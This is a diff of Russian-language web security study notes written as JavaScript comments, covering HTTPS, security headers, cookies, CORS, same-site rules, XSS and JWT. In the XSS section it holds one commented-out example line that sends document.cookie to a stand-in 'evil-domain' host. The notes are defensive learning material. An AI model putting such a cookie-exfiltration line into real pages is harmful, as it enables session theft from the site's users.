@@ -83,7 +83,7 @@
 //? data: ----- Data URLs
 //? file: ----- Host-specific file names
 //? ftp: ----- File Transfer Protocol
-//? http: ----- https	Hyper text transfer protocol (Secure)
+//? http/https: ----- Hyper text transfer protocol (Secure)
 //? javascript: ----- URL-embedded JavaScript code
 //? mailto: ----- Electronic mail address
 //? ssh: ----- Secure shell
@@ -98,6 +98,7 @@
 *****/
 //!=============================================================================
 //? /HTTP/HTTPS/
+// https://web.dev/articles/why-https-matters?hl=en
 // https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP
 
 //? http/https - hyper text transfer protocol протоколы позволяющие обмениваться данными
@@ -113,6 +114,31 @@
 //? нет состояния - например аутентификации. Достигается это например с помощью cookie
 
 //? позволяет кэшировать
+
+
+
+//? локальная разработка с https, нужна чтобы например тестировать некоторые функции которые доступны только в https
+// https://web.dev/articles/when-to-use-local-https?hl=en
+
+
+
+//? всегда следует испрользовать https, банально потому, что многие функции(PWA) доступны только в https
+//? не позволяет злоумышленникам прослушить взаимодействие с сервером или подменять что то
+
+//? Strict-Transport-Security всегда нужно указывать
+
+
+
+//? когда получаем сайт через https, но остальные ресурсы мы получаем через http - контент смешанный(mixed content)
+//? разные браузеры по разному обрабатывают такой контент(chrome например mixed content в консоль предупреждение кладет для пассивного, а для активного - ошибку и не загружает его)
+
+//? пассивный - img/video/audio и максимум что может злоумышленник сделать - заменить их или отследить пользователя куда он заходит
+//? активный - скриипты, css, iframe и любой код который браузер может выполнить
+
+
+
+//? Content-Security-Policy - с помощью этого заголовка можно гибко настроить политику обработки смешанного контента и в целом какой контент доступен сайту
+//? <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests"> - равнозначная аналогия
 /*
 **
 ***
@@ -217,9 +243,14 @@
 
 //? структура
 //? http://www.example.com:80/path/to/myfile.html?key1=value1&key2=value2#SomewhereInTheDocument
+
 //? http:// - протокол
 
 //? www.example.com - domain(ip address)
+
+//? .com - TLD (домен верхнего уровня)
+
+//? example.com - TLD+1
 
 //? :80 - port (80 для HTTP и 443 для HTTPS)
 
@@ -241,9 +272,10 @@
 //!=============================================================================
 //? /Headers/
 
+//? Sec
+//? начинающиеся с Sec не могут быть установлены через js, всегда устанавливаются браузером
 
-//? Content-Security-Policy
-//? защита от xxs атак, разрешить загружать данные из определенных источников (CSP)
+
 
 
 //? Strict-Transport-Security
@@ -255,9 +287,6 @@
 // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options
 //? это маркер, используемый сервером для указания того, что типы MIME , объявленные в Content-Typeзаголовках, следует соблюдать и не изменять. Заголовок позволяет избежать перехвата типов MIME , сообщая, что типы MIME настроены намеренно.
 
-
-//? X-Frame-Options
-// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
 
 
 //? X-XSS-Protection
@@ -321,6 +350,18 @@
 
 //? Access-Control-Allow-Methods
 //? ответ на OPTIONS какие методы можем использовать
+
+
+
+//? Content-Security-Policy
+// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy
+//? защита от xxs атак, разрешить загружать данные из определенных источников (CSP)
+
+
+
+//? Strict-Transport-Security
+// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security
+//? указывает, что сайт доступен только по https, браузер автоматически будет конвертировать в https последующие обращения к этому сайту
 
 
 
@@ -474,6 +515,13 @@
 //? Range
 // https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range
 //? какие части запроса сервер должен вернуть (Range requests)
+
+
+
+//? Sec-Fetch-Site
+// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site
+//? узнать какой тип запроса (samesite, crossite, sameorigin, crossorigin)
+//? заголовок браузер устанавливает, через js нельзя
 /*
 **
 ***
@@ -582,11 +630,13 @@
 // https://developer.mozilla.org/ru/docs/Web/HTTP/Cookies
 // https://learn.javascript.ru/cookie
 // https://techcrunch.com/2020/05/06/no-cookie-consent-walls-and-no-scrolling-isnt-consent-says-eu-data-protection-body/?guccounter=1
-//? это файл, отправляемый с клиента на сервер
-//? для персонализации, сессий, отслеживания
+// https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
+//? это файл, отправляемый с клиента на сервер, для персонализации, сессий, отслеживания, чтобы использовать только в https - Secure директива нужна
 
 
-//? любой js файл на странице может получить доступ к ним(то есть мы можем встроить сторонний скрипт, который может получить куки)
+
+//? любой js файл на странице может получить доступ к ним(то есть мы можем встроить сторонний скрипт, который может получить куки, кроме httpOnly)
+
 
 
 //? Бывают:
@@ -594,6 +644,7 @@
 
 //? стороннние - когда нет, например сайт bank загружает картинку с сайта test, test устанавливает в запрос на картинку куки и они являются сторонними для сайта bank и отправляются только на запрос на сервер test
 //? но что еще более важно, когда пользователь уйдет с bank на какой то другой сайт, но где ТАКЖЕ есть запрос на test - в браузере то куки уже хранятся, а значит другой сайт нас узнает как пользователя(так можно отслеживать пользователя)
+
 
 
 //? Если мы загружаем скрипт со стороннего домена, например <script src="https://google-analytics.com/analytics.js">, и этот скрипт использует document.cookie, чтобы установить куки, то такое куки не является сторонним.
@@ -672,19 +723,28 @@
 ****
 *****/
 //!=============================================================================
-//? /CORS/
+//? /Same-origin/Cross-origin/Sameorigin/Crossorigin/CORS/
+// https://web.dev/articles/same-site-same-origin
 // https://developer.mozilla.org/en-US/docs/Glossary/CORS
 // https://aws.amazon.com/ru/what-is/cross-origin-resource-sharing/#:~:text=Cross%2Dorigin%20resource%20sharing%20(CORS,resources%20in%20a%20different%20domain.
 // https://enable-cors.org/server.html
 // https://httptoolkit.com/will-it-cors/
 // https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/Errors
+// https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
+//? зарпещает доступ одних источников к другим, если они из разных источников
+
 //? CORS система передачи заголовков, чтобы разрешить получать данные из разных источников (Same-origin policy), то есть если мы хотим получить данные из другого источника - сервер должен нам отдать заголовки разрешающие это сделать
+
+
+
+//? same-origin: такие же protocol.domain(host).port
+//? cross-origin остальные
 
 
 
 //? какие запросы используют CORS - сложные запросы считаются таковыми
 //? методы отличные GET | POST | HEAD
-//? Заголовки, отличные от Accept-Language, Accept или Content-Language
+//? Заголовки, отличные от Accept-Language | Accept | Content-Language
 //? Заголовки Content-Type, отличные от multipart/form-data, application/x-www-form-urlencoded и text/plain
 
 
@@ -698,46 +758,70 @@
 
 
 
-//? по умолчанию браузеры не отправляют через fetch/XmlHttpRequest cookie, чтобы включить отправку - нужно withCredentials = true
-/*
-**
-***
-****
-*****/
-//!=============================================================================
-//? /Same-origin policy/
-// https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
-//? зарпещает доступ одних источников к другим, если они разные
+//? по умолчанию браузеры не отправляют через fetch/XmlHttpRequest cookie, чтобы включить отправку - нужно withCredentials = true, но тогда и сервер должен установить
+//? Access-Control-Allow-Origin: тут источник откуда был запрос на сервер
+//? Access-Control-Allow-Credentials: true
 
-//? одинаковые: один и тот же protocol, такой же domain, такой же port - все остальное - это разные источники
 
 
 //? хранилища, indexedDB, cookies - для каждого источника - свои
 
 
+
 //? можно через js изменить domain через document.domain, но это устаревшее
+
 
 
 //? есть ресусры которые можно встраивать из разных источников
 //? js
-//? css
-//? img
+//? css, но должен быть content-type верный
+//? img (но получать через js нельзя)
 //? video/audio
 //? iframe
 
 
 //? 2 документа могут ссылаться друг на друга через iframe без ограничений если они из одного источника, iframe.contentWidnow, window.parent, window.opener, window.opener, документы из разных источников будут иметь ограниченный доступ по этим свойствам и могут общаться только через postMessage
+
 /*
 **
 ***
 ****
 *****/
 //!=============================================================================
-//? /CSP/Content Security Policy/XSS/
+//? /SameSite/Crossite/
+// https://web.dev/articles/same-site-same-origin
+
+
+//? Samesite это когда protocol.TLD+1 совпадают
+
+//? TLD+1 - это example.com в примере ниже
+//? TLD - .com
+
+//? https://www.example.com:443/foo, то «сайт» — это https://example.com
+//? https://www.example.com:443 и https://логин.example.com:443 разные поддомены не имеют значения, поэтому это один и тот же сайт
+
+
+
+//? Чтобы узнать является запрос crossorigin/crosssite/sameorigin/samesite, браузер прикрепляет заголовок Sec-Fetch-Site.
+/*
+**
+***
+****
+*****/
+//!=============================================================================
+//? /CSP/Content Security Policy/XSS/Crosssite scripting/
 // https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting
 // https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
-//? Защита получения данных из разных источников, например, чтобы предотвратить xxs атаку
+//? Защита получения данных из разных источников, чтобы предотвратить xxs атаку (например встраивание вредоносного кода в eval/innerHTML)
 //? можем разрешить получать определенные файлы только из определенных источников
+
+
+
+//? Для того, чтобы избежать атак, можно использовать библиотеки типа DOMPurify либо фреймворки типа angular уже внутри себя имеют такое решение (они внутри правильно обрабатывают тэги и скрипты, чтобы было сложно внедрить код плохой), либо TrustedTypeAPI
+
+
+
+//? можно прослушать событе securitypolicyviolation, которое вызывается когда есть ошибки CSP
 /*
 **
 ***
@@ -777,6 +861,7 @@
 //!=============================================================================
 //? /WEBSECURITY/
 //? /Check site/Проверить сайт на безопасноть/
+// https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
 // https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation
 // https://observatory.mozilla.org/
 // https://infosec.mozilla.org/guidelines/web_security
@@ -784,7 +869,6 @@
 
 //? CORS
 //? HTTPS - Strict-Transport-Security заголовок
-//? 
 
 
 
@@ -794,8 +878,8 @@
 //? То есть над страницей что мы видим невидимом слое злоумышленники размещают другую страницу, и пользователь взаимодействует с ней
 
 
-// https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors
-// X-Frame-Options
+
+//? Content-Security-Policy and X-Frame-Options directive
 //? Предотвратить можно с помощью frame-ancestors, которая указывает какие родительские страницы могут вставлять эту страницу в iframe
 /*
 **
@@ -848,6 +932,61 @@
 //? Получение доступа к cookie
 
 // new Image().src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+/*
+**
+***
+****
+*****/
+/*
+**
+***
+****
+*****/
+/*
+**
+***
+****
+*****/
+//!=============================================================================
+//? /Authorization/Авторизация/
+
+//? /JWT/
+// https://jwt.io/introduction
+
+//? Униакальный токен нужный для авторизации
+//? Используются, потому что JSON имеет маленький размер, меньше чем XML, SAML
+
+
+
+//? клиент делает запрос на авторизацию (пароль, никнейм)
+//? сервер отдает access/refresh токены (каждый имеет срок действия)
+//? клиент цепляет access токены при следующих запросах в основном в заголовке Authorization
+//? сервер проверяет токен и есть он валидный - то отдает данные
+//? если токен невалидный отдается 401 ошибка
+//? клиент делает запрос на refresh
+//? сервер проверяет refresh токен и есть все ок - то отдает новые access/refresh токены
+
+
+
+//? состоит из 3 частей: header.payload.signature
+
+//? header
+//? какой тип шифрования используется HMAC SHA256 или RSA
+//? кодируются в Base64Url
+
+//? payload
+//? полезная нагрузка (в основном информация о пользователе)
+
+//? signature
+//? зашифрованные header.payload с помощью секретного ключа и алгоритма указанного в заголовке
+/*
+HMACSHA256(
+    base64UrlEncode(header) + '.' +
+    base64UrlEncode(payload),
+    secret
+)
+*/
+
 /*
 **
 ***
@@ -6617,6 +6756,8 @@ controller.abort();
 //? при восстановлении вкладки - сохранится, после перезагрузки
 //? другая вкладка с той же страницей будет иметь собственное хранилище, но если страницы из одного источника и одна из них в iframe - то хранилище будет разделено
 //? можно получить доступ через сторонний скрипт - не безопасно(можно получить ключ по индексу) и затем получить значение
+
+//? не безопасно хранить данные
 /*
 **
 ***
@@ -6627,6 +6768,8 @@ controller.abort();
 //? сохранит данные пока явно не удалить или не очистить хранилище браузера
 //? storage window event - если один и тот же домен, но разные страницы, чтобы синхронизировать изменения
 //? можно получить доступ через сторонний скрипт - не безопасно(можно получить ключ по индексу) и затем получить значение
+
+//? не безопасно хранить данные
 /*
 **
 ***
@@ -6651,6 +6794,8 @@ controller.abort();
 //? доступны расширениям браузера!
 //? запись синхронна и пихать слишком вложенные обьекты не надо, потому что браузеру необходимо сделать будет клон этого обьекта, то есть лучше всего хранить ключ=значение и все, и оно не должно быть большим
 //? доступны в webWorker
+
+//? не безопасно хранить данные
 /*
 **
 ***
